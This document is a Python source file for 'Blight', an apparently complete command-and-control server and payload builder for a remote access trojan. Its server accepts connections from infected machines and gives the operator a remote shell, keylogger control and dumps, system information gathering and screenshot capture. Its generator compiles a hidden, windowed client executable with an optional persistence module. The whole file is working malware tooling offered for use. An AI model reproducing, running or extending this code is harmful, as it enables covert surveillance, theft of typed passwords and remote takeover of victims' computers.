import socket
import threading
import subprocess
import shutil
import os
import sys
import platform
import time
import base64
import tabulate
import argparse
import PyInstaller.__main__
from datetime import datetime
from colorama import init, Fore, Style

init()

__LOGO__ = f'''
{Fore.GREEN}{Style.BRIGHT}
░▒▓███████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓███████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░▒▓████████▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
{Style.RESET_ALL}
'''

__HELP_OVERALL__ = f'''
usage: python3 blight.py command [--help] [--option OPTION]

These are the commands available for usage:

    bind        Run the Server on machine and establish connections
    generate    Generate the Payload file for target platform

You can further get help on available commands by supplying
'--help' argument. For example: 'python3 blight.py generate --help'
will print help manual for generate command
'''

__HELP_BIND__ = f'''
usage: python3 blight.py bind [--address ADDRESS] [--port PORT]

    Args              Description
    -h, --help        Show Help for Bind command
    -a, --address     IP Address to Bind to
    -p, --port        Port Number on which to Bind

The Bind command is used to bind the application on server
for incoming connections and control the clients through
the command interface
'''

__HELP_GENERATE__ = f'''
usage: python3 blight.py generate [--address ADDRESS] [--port PORT] [--output OUTPUT]

    Args              Description
    -h, --help        Show Help Manual for generate command
    -a, --address     IP Address of server. [Connect to]
    -p, --port        Port of connecting server
    -o, --output      Output file to generate
    -s, --source      Do not generate compiled code.
                      Gives Python source file.
        --persistence Auto start on reboot [Under Development]

The generate command generates the required payload
file to be executed on client side. The establish
connection to server and do commands.
'''


class PULL:
    def __init__(self):
        pass

    def get_com(self, mss=()):
        if mss:
            prompt = (f'{Fore.CYAN}{Style.BRIGHT}$ {Style.RESET_ALL}'
                      f'[{Fore.GREEN}{mss[1].ip}{Style.RESET_ALL}:'
                      f'{Fore.RED}{mss[1].port}{Style.RESET_ALL}] ')

        else:
            prompt = f'{Fore.CYAN}{Style.BRIGHT}$ {Style.RESET_ALL}'

        rtval = input(prompt).rstrip().lstrip()

        return rtval

    def print(self, text):
        print(f'{Fore.GREEN}[{Style.BRIGHT}*{Style.RESET_ALL}{Fore.GREEN}] '
              f'{Style.RESET_ALL}{text}{Style.RESET_ALL}')

    def function(self, text):
        print(f'{Fore.BLUE}[{Style.BRIGHT}:{Style.RESET_ALL}{Fore.BLUE}] '
              f'{Style.RESET_ALL}{text}{Style.RESET_ALL}')

    def error(self, text):
        print(f'{Fore.RED}[{Style.BRIGHT}!{Style.RESET_ALL}{Fore.RED}] '
              f'{Style.RESET_ALL}{text}{Style.RESET_ALL}')

    def exit(self, text=''):
        sys.exit(f'{Fore.RED}[{Style.BRIGHT}~{Style.RESET_ALL}{Fore.RED}] '
                 f'{Style.RESET_ALL}{text}{Style.RESET_ALL}')

    def logo(self):
        print(f'{Fore.GREEN}{__LOGO__}{Style.RESET_ALL}')

    def help_c_current(self):
        headers = (f'{Style.BRIGHT}Command{Style.RESET_ALL}',
                   f'{Style.BRIGHT}Description{Style.RESET_ALL}')

        lister = [
            ('help', 'Shows manual for commands'),
            ('sessions', 'Show all connected clients to the server'),
            ('connect', 'Connect to a specific client'),
            ('disconnect', 'Disconnect from the current client'),
            ('clear', 'Clear screen'),
            ('shell', 'Launch a new terminal/shell.'),
            ('keylogger', 'Keylogger module'),
            ('sysinfo', 'Dump system, processor, CPU and network information'),
            ('screenshot', 'Take screenshot on target machine and save on local'),
            ('exit', 'Exit from Blight')
        ]

        sys.stdout.write('\n')
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write('\n')

    def help_c_general(self):
        headers = (f'{Style.BRIGHT}Command{Style.RESET_ALL}',
                   f'{Style.BRIGHT}Description{Style.RESET_ALL}')

        lister = [
            ('help', 'Shows manual for commands'),
            ('sessions', 'Show all connected clients to the server'),
            ('connect', 'Connect to a specific client'),
            ('disconnect', 'Disconnect from the current client'),
            ('clear', 'Clear screen'),
            ('exit', 'Exit from Blight')
        ]

        sys.stdout.write('\n')
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write('\n')

    def help_c_sessions(self):
        sys.stdout.write('\n')
        print('Info       : Display connected sessions to the server!')
        print('Arguments  : None')
        print('Example    : \n')
        print('$ sessions')
        sys.stdout.write('\n')

    def help_c_connect(self):
        sys.stdout.write('\n')
        print('Info       : Connect to an available session!')
        print('Arguments  : Session ID')
        print('Example    : \n')
        print('$ connect 56\n')

        headers = (f'{Style.BRIGHT}Argument{Style.RESET_ALL}',
                   f'{Style.BRIGHT}Type{Style.RESET_ALL}',
                   f'{Style.BRIGHT}Description{Style.RESET_ALL}')

        lister = [
            ('ID', 'integer', 'ID of the sessions from the list')
        ]

        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write('\n')

    def help_c_disconnect(self):
        sys.stdout.write('\n')
        print('Info       : Disconnect current session!')
        print('Arguments  : None')
        print('Example    : \n')
        print('$ disconnect')
        sys.stdout.write('\n')

    def help_c_clear(self):
        sys.stdout.write('\n')
        print('Info       : Clear screen!')
        print('Arguments  : None')
        print('Example    : \n')
        print('$ clear')
        sys.stdout.write('\n')

    def help_c_shell(self):
        sys.stdout.write('\n')
        print('Info       : Launch a shell against client!')
        print('Arguments  : None')
        print('Example    : \n')
        print('$ shell')
        sys.stdout.write('\n')

    def help_c_keylogger(self):
        sys.stdout.write('\n')
        print('Info       : Keylogger module!')
        print('Arguments  : on, off, dump')
        print('Example    : \n')
        print('$ keylogger on')
        print('$ keylogger off')
        print('$ keylogger dump\n')

        headers = (f'{Style.BRIGHT}Argument{Style.RESET_ALL}',
                   f'{Style.BRIGHT}Description{Style.RESET_ALL}')

        lister = [
            ('on', 'Turn Keylogger on'),
            ('off', 'Turn Keylogger off'),
            ('dump', 'Dump keylogs')
        ]

        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write('\n')

    def help_c_sysinfo(self):
        sys.stdout.write('\n')
        print('Info       : Gathers system information!')
        print('Arguments  : None')
        print('Example    : \n')
        print('$ sysinfo')
        sys.stdout.write('\n')

    def help_c_screenshot(self):
        sys.stdout.write('\n')
        print('Info       : Screenshot the current screen and save it on server!')
        print('Arguments  : None')
        print('Example    : \n')
        print('$ screenshot')
        sys.stdout.write('\n')

    def help_overall(self):
        print(__HELP_OVERALL__)

        sys.exit(0)

    def help_bind(self):
        print(__HELP_BIND__)

        sys.exit(0)

    def help_generate(self):
        print(__HELP_GENERATE__)

        sys.exit(0)


pull = PULL()


class CLIENT:
    STATUS = 'Active'
    MESSAGE = ''
    KEY = ')J@NcRfU'

    def __init__(self, sock, addr):
        self.sock = sock
        self.ip = addr[0]
        self.port = addr[1]

    def acceptor(self):
        data = ''
        chunk = ''

        while True:
            chunk = self.sock.recv(4096)

            if not chunk:
                self.STATUS = 'Disconnected'

                break

            data += chunk.decode('utf-8')

            if self.KEY.encode('utf-8') in chunk:
                try:
                    self.MESSAGE = base64.decodebytes(
                        data.rstrip(self.KEY).encode('utf-8')).decode('utf-8')
                except UnicodeDecodeError:
                    self.MESSAGE = base64.decodebytes(
                        data.rstrip(self.KEY).encode('utf-8'))

                if not self.MESSAGE:
                    self.MESSAGE = ' '

                data = ''

    def engage(self):
        t = threading.Thread(target=self.acceptor)
        t.daemon = True

        t.start()

    def send_data(self, val):
        self.sock.send(base64.encodebytes(val.encode('utf-8')) +
                       self.KEY.encode('utf-8'))

    def recv_data(self):
        while not self.MESSAGE:
            try:
                pass
            except KeyboardInterrupt:
                break

        rtval = self.MESSAGE

        self.MESSAGE = ''

        return rtval


class COMMCENTER:
    CLIENTS = []
    COUNTER = 0
    CURRENT = ()
    KEYLOGS = []

    def c_help(self, vals):
        if len(vals) > 1:
            if vals[1] == 'sessions':
                pull.help_c_sessions()

            elif vals[1] == 'connect':
                pull.help_c_connect()

            elif vals[1] == 'disconnect':
                pull.help_c_disconnect()

            elif vals[1] == 'clear':
                pull.help_c_clear()

            elif vals[1] == 'shell':
                pull.help_c_shell()

            elif vals[1] == 'keylogger':
                pull.help_c_keylogger()

            elif vals[1] == 'sysinfo':
                pull.help_c_sysinfo()

            elif vals[1] == 'screenshot':
                pull.help_c_screenshot()

        else:
            if self.CURRENT:
                pull.help_c_current()

            else:
                pull.help_c_general()

    def get_valid(self, _id):
        for client in self.CLIENTS:
            if client[0] == int(_id):
                return client

        return False

    def c_connect(self, args):
        if len(args) == 2:
            tgt = self.get_valid(args[1])

            if tgt:
                self.CURRENT = tgt

            else:
                sys.stdout.write('\n')
                pull.error('No client is associated with that ID!')
                sys.stdout.write('\n')

        else:
            sys.stdout.write('\n')
            pull.error('Invalid Syntax!')
            sys.stdout.write('\n')

    def c_disconnect(self):
        self.CURRENT = ()

    def c_sessions(self):
        headers = (
            f'{Style.BRIGHT}ID{Style.RESET_ALL}',
            f'{Style.BRIGHT}IP Address{Style.RESET_ALL}',
            f'{Style.BRIGHT}Incoming Port{Style.RESET_ALL}',
            f'{Style.BRIGHT}Status{Style.RESET_ALL}'
        )

        lister = []

        for client in self.CLIENTS:
            toappend = []
            toappend.append(f'{Fore.RED}{client[0]}{Style.RESET_ALL}')
            toappend.append(f'{Fore.CYAN}{client[1].ip}{Style.RESET_ALL}')
            toappend.append(f'{Fore.BLUE}{client[1].port}{Style.RESET_ALL}')
            toappend.append(f'{Fore.GREEN}{client[1].STATUS}{Style.RESET_ALL}')
            lister.append(toappend)

        sys.stdout.write('\n')
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write('\n')

    def c_shell(self):
        result = ''

        if self.CURRENT:
            sys.stdout.write('\n')

            while True:
                val = input('# ')
                val = f'shell:{val.rstrip().lstrip()}'

                if val:
                    if val != 'shell:exit':
                        self.CURRENT[1].send_data(val)

                        result = self.CURRENT[1].recv_data()

                        if result.strip():
                            print(result)

                    else:
                        break

        else:
            sys.stdout.write('\n')
            pull.error('You need to connect before execute this command!')
            sys.stdout.write('\n')

    def c_clear(self):
        subprocess.call(['clear'], shell=True)

    def c_keylogger(self, args):
        if self.CURRENT:
            if len(args) == 2:
                if args[1] == 'status':
                    return

                elif args[1] == 'on':
                    self.CURRENT[1].send_data('keylogger:on')

                    result = self.CURRENT[1].recv_data()

                    if result.strip():
                        print(result)

                elif args[1] == 'off':
                    self.CURRENT[1].send_data('keylogger:off')

                    result = self.CURRENT[1].recv_data()

                    if result.strip():
                        print(result)

                elif args[1] == 'dump':
                    self.CURRENT[1].send_data('keylogger:dump')

                    result = self.CURRENT[1].recv_data()
                    dirname = os.path.dirname(__file__)
                    dirname = os.path.join(dirname, 'keylogs')

                    if not os.path.isdir(dirname):
                        os.mkdir(dirname)

                    dirname = os.path.join(dirname, f'{self.CURRENT[1].ip}')

                    if not os.path.isdir(dirname):
                        os.mkdir(dirname)

                    fullpath = os.path.join(
                        dirname, datetime.now().strftime('%d-%m-%Y %H:%M:%S.txt'))

                    fl = open(fullpath, 'w')
                    fl.write(result)
                    fl.close()

                    pull.print(f'Dumped: [{Fore.GREEN}{fullpath}{Style.RESET_ALL}]')

                else:
                    pull.error('Invalid Syntax!')

            else:
                pull.error('Invalid Syntax!')

        else:
            pull.error('You need to connect before execute this command!')

    def c_sysinfo(self):
        if self.CURRENT:
            self.CURRENT[1].send_data('sysinfo:')

            result = self.CURRENT[1].recv_data()

            if result.strip():
                print(result)

        else:
            pull.error('You need to connect before execute this command!')

    def c_screenshot(self):
        if self.CURRENT:
            self.CURRENT[1].send_data('screenshot:')

            result = self.CURRENT[1].recv_data()
            dirname = os.path.dirname(__file__)
            dirname = os.path.join(dirname, 'screenshots')

            if not os.path.isdir(dirname):
                os.mkdir(dirname)

            dirname = os.path.join(dirname, f'{self.CURRENT[1].ip}')

            if not os.path.isdir(dirname):
                os.mkdir(dirname)

            fullpath = os.path.join(
                dirname, datetime.now().strftime('%d-%m-%Y %H:%M:%S.png'))

            fl = open(fullpath, 'wb')
            fl.write(result)
            fl.close()

            pull.print(f'Saved: [{Fore.CYAN}{fullpath}{Style.RESET_ALL}]')

        else:
            pull.error('You need to connect before execute this command!')

    def c_exit(self):
        sys.stdout.write('\n')
        pull.exit('See Ya!\n')


class INTERFACE(COMMCENTER):
    SOCKET = None
    RUNNER = True

    def __init__(self, prs):
        self.address = prs.address
        self.port = prs.port

    def bind(self):
        self.SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            self.SOCKET.bind((self.address, self.port))

            pull.print(f'Successfuly Bind to {Fore.RED}{self.address}'
                       f'{Style.RESET_ALL}:{self.port}')
        except Exception as e:
            pull.exit(f'Unable to bind to {Fore.RED}{self.address}'
                      f'{Style.RESET_ALL}:{self.port}')

    def accept_threads(self):
        self.SOCKET.listen(10)

        while self.RUNNER:
            conn, addr = self.SOCKET.accept()

            self.COUNTER += 1

            client = CLIENT(conn, addr)
            client.engage()

            self.CLIENTS.append((self.COUNTER, client))

    def accept(self):
        t = threading.Thread(target=self.accept_threads)
        t.daemon = True
        t.start()

    def execute(self, vals):
        if vals:
            if vals[0] == 'exit':
                self.c_exit()

            elif vals[0] == 'help':
                self.c_help(vals)

            elif vals[0] == 'sessions':
                self.c_sessions()

            elif vals[0] == 'connect':
                self.c_connect(vals)

            elif vals[0] == 'disconnect':
                self.c_disconnect()

            elif vals[0] == 'shell':
                self.c_shell()

            elif vals[0] == 'clear':
                self.c_clear()

            elif vals[0] == 'keylogger':
                self.c_keylogger(vals)

            elif vals[0] == 'sysinfo':
                self.c_sysinfo()

            elif vals[0] == 'screenshot':
                self.c_screenshot()

    def launch(self):
        pull.print('Launching Interface! Enter \'help\' to get available commands! \n')

        while True:
            val = pull.get_com(self.CURRENT)

            self.execute(val.split(' '))

    def close(self):
        self.SOCKET.close()


class GENERATOR:
    data = ''
    flname = ''

    def __init__(self, prs):
        self.address = prs.address
        self.port = prs.port
        self.source = prs.source
        self.persistence = prs.persistence
        self.output = self.get_output(prs.output)
        self.pather = self.get_path()
        self.v_imports = self.get_imports()
        self.v_consts = self.get_consts()
        self.v_persistence = self.get_persistence()
        self.v_sysinfo = self.get_sysinfo()
        self.v_screenshot = self.get_screenshot()
        self.v_client = self.get_client()
        self.v_main = self.get_main()

    def get_output(self, out):
        rtval = ''

        if self.source:
            if not out.endswith('.py'):
                rtval = f'{out}.py'

            else:
                rtval = out

        else:
            if platform.system() == 'Windows':
                if not out.endswith('.exe'):
                    rtval = f'{out}.exe'

                else:
                    rtval = out

            elif platform.system() == 'Linux':
                rtval = out

            else:
                pull.exit('Unrecognized Platform')

        return rtval

    def get_path(self):
        dirname = os.path.dirname(__file__)
        dirname = os.path.join(dirname, 'mods')

        if os.path.isdir(dirname):
            return dirname

        else:
            pull.exit('Files missing to generate the payload!')

    def get_imports(self):
        topen = os.path.join(self.pather, 'imports.py')
        fl = open(topen)

        data = fl.read()
        fl.close()

        return data

    def get_consts(self):
        data = f'CONSTIP = \'{self.address}\'\nCONSTPT = {self.port}'

        return data

    def get_persistence(self):
        topen = os.path.join(self.pather, 'persistence.py')
        fl = open(topen)

        data = fl.read()
        fl.close()

        return data

    def get_sysinfo(self):
        topen = os.path.join(self.pather, 'sysinfo.py')
        fl = open(topen)

        data = fl.read()
        fl.close()

        return data

    def get_screenshot(self):
        topen = os.path.join(self.pather, 'screenshot.py')
        fl = open(topen)

        data = fl.read()
        fl.close()

        return data

    def get_client(self):
        topen = os.path.join(self.pather, 'client.py')
        fl = open(topen)

        data = fl.read()
        fl.close()

        return data

    def get_main(self):
        topen = os.path.join(self.pather, 'main.py')
        fl = open(topen)

        data = fl.read()
        fl.close()

        return data

    def tmp_dir(self):
        dirname = os.path.dirname(__file__)
        dirname = os.path.join(dirname, 'tmp')

        if not os.path.isdir(dirname):
            os.mkdir(dirname)

        fname = os.path.join(dirname, 'cl.py')

        return (dirname, fname, 'cl.py')

    def patch(self):
        time.sleep(2)
        pull.function('Compiling modules ... ')

        self.data = (f'{self.v_imports}\n\n{self.v_consts}\n'
                     f'{self.v_persistence}\n{self.v_sysinfo}\n\n'
                     f'{self.v_screenshot}\n\n{self.v_client}\n\n{self.v_main}')

        time.sleep(2)
        pull.function('Generating source code ...')

        fl = open(self.output, 'w')
        fl.write(self.data)
        fl.close()

        time.sleep(2)

        pull.print('Code generated successfully!')
        pull.print(f'File: {self.output}')

    def generate(self):
        time.sleep(2)

        pull.function('Compiling modules ... ')

        self.data = (f'{self.v_imports}\n\n{self.v_consts}\n\n'
                     f'{self.v_persistence}\n\n{self.v_sysinfo}\n\n'
                     f'{self.v_screenshot}\n\n{self.v_client}\n\n{self.v_main}')

        time.sleep(2)

        pull.function('Generating one time code for binary ')

        self.flname = self.tmp_dir()

        fl = open(self.flname[1], 'w')
        fl.write(self.data)
        fl.close()

        pull.print('Code generated successfully!')

    def compile(self):
        pull.function('Compiling generated code /\\')

        counter = 1

        t = threading.Thread(
            target=PyInstaller.__main__.run,
            args=([
                f'--name={os.path.basename(self.output)}',
                '--onefile',
                '--windowed',
                '--log-level=ERROR',
                f'--distpath={os.path.dirname(self.output)}',
                f'--workpath={self.flname[0]}',
                os.path.join(self.flname[0], self.flname[2])
            ])
        )
        t.daemon = True
        t.start()

        while t.is_alive():
            sys.stdout.write(
                f'\r{Fore.BLUE}[{Style.BRIGHT}:{Style.RESET_ALL}{Fore.BLUE}] '
                f'{Style.RESET_ALL}Elapsed Time: {counter}s{Style.RESET_ALL}')

            time.sleep(1)

            counter += 1

        sys.stdout.write('\n')
        pull.print('Compiled Successfully!')

    def clean(self):
        pull.function('Cleaning files and temporary codes')
        shutil.rmtree(self.flname[0])
        pull.print(f'File: {self.output}')


class PARSER:
    COMMANDS = ['bind', 'generate']

    def __init__(self, prs):
        self.mode = self.v_mode(prs.mode, prs.help)
        self.help = self.v_help(prs.help)

        if self.mode == 'bind':
            self.address = self.v_address(prs.address)
            self.port = self.v_port(prs.port)

        elif self.mode == 'generate':
            self.address = self.v_address(prs.address)
            self.port = self.v_port(prs.port)
            self.output = self.v_output(prs.output)
            self.source = prs.source
            self.persistence = prs.persistence

    def v_help(self, hl):
        if hl:
            if not self.mode:
                pull.help_overall()

            else:
                if self.mode == 'bind':
                    pull.help_bind()

                elif self.mode == 'generate':
                    pull.help_generate()

                else:
                    pull.help_help()

    def v_address(self, str):
        return str

    def v_port(self, port):
        if not port:
            pull.exit('You need to Supply a Valid Port Number')

        if port <= 0 or port > 65535:
            pull.exit('Invalid Port Number')

        return port

    def v_mode(self, val, hl):
        if val:
            if val in self.COMMANDS:
                return val

            else:
                pull.exit('No such command found in database')

        else:
            if not hl:
                pull.exit('Invalid Syntax. Refer to the manual!')

    def v_output(self, val):
        if val:
            if os.path.isdir(os.path.dirname(val)):
                return val

            else:
                pull.exit('Directory doesn\'t exist!')
        else:
            pull.exit('You must provide an output path!')


pull.logo()
parser = argparse.ArgumentParser(add_help=False)
parser.add_argument('mode', nargs='?', help='Mode')
parser.add_argument('-h', '--help', dest='help', default=False, action='store_true', help='Help manual')
parser.add_argument('-a', '--address', dest='address', default='', type=str, help='Bind address')
parser.add_argument('-p', '--port', dest='port', default=0, type=int, help='Bind port')
parser.add_argument('-o', '--output', dest='output', default='', type=str, help='Complete path to the output file')
parser.add_argument('-s', '--source', dest='source', default=False, action='store_true', help='Source file')
parser.add_argument('--persistence', dest='persistence', default=False, action='store_true', help='Persistence')
parser = parser.parse_args()
parser = PARSER(parser)

if parser.mode == 'bind':
    iface = INTERFACE(parser)
    iface.bind()
    iface.accept()
    iface.launch()
    iface.close()

elif parser.mode == 'generate':
    pull.function('Starting Generator Mode!')
    generator = GENERATOR(parser)

    if generator.source:
        generator.patch()

    else:
        generator.generate()
        generator.compile()
        generator.clean()

    pull.function('Done')
